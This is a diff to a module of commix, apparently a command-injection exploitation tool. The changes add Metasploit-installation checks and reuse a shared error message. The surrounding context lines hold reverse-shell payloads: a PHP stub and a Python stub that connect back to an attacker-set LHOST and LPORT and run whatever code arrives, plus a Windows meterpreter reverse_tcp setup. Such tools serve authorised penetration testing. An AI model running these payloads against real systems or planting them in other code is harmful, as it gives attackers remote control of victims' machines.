@@ -168,6 +168,11 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
     # PHP-reverse-shell (meterpreter)
     elif other_shell == '5':
 
+      if not os.path.exists(settings.METASPLOIT_PATH):
+        error_msg = settings.METASPLOIT_ERROR_MSG
+        print settings.print_error_msg(error_msg)
+        continue
+
       other_shell ="""/*<?php /**/ error_reporting(0); 
 $ip = '""" + settings.LHOST  + """'; $port = """ + settings.LPORT  + """;
 if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); 
@@ -211,6 +216,11 @@ case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgs
 
     # Python-reverse-shell (meterpreter)
     elif other_shell == '6':
+
+      if not os.path.exists(settings.METASPLOIT_PATH):
+        error_msg = settings.METASPLOIT_ERROR_MSG
+        print settings.print_error_msg(error_msg)
+        continue
 
       other_shell = """import socket,struct
 s=socket.socket(2,1)
@@ -262,9 +272,9 @@ exec(d,{'s':s})"""
 commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + Style.RESET_ALL + """) > """)
 
           if not os.path.exists(settings.METASPLOIT_PATH):
-            error_msg = "You need to have Metasploit installed. Please ensure Metasploit is installed in the right path."
+            error_msg = settings.METASPLOIT_ERROR_MSG
             print settings.print_error_msg(error_msg)
-            break
+            continue
             
           payload = "windows/meterpreter/reverse_tcp"
           output = "powershell_attack.txt"
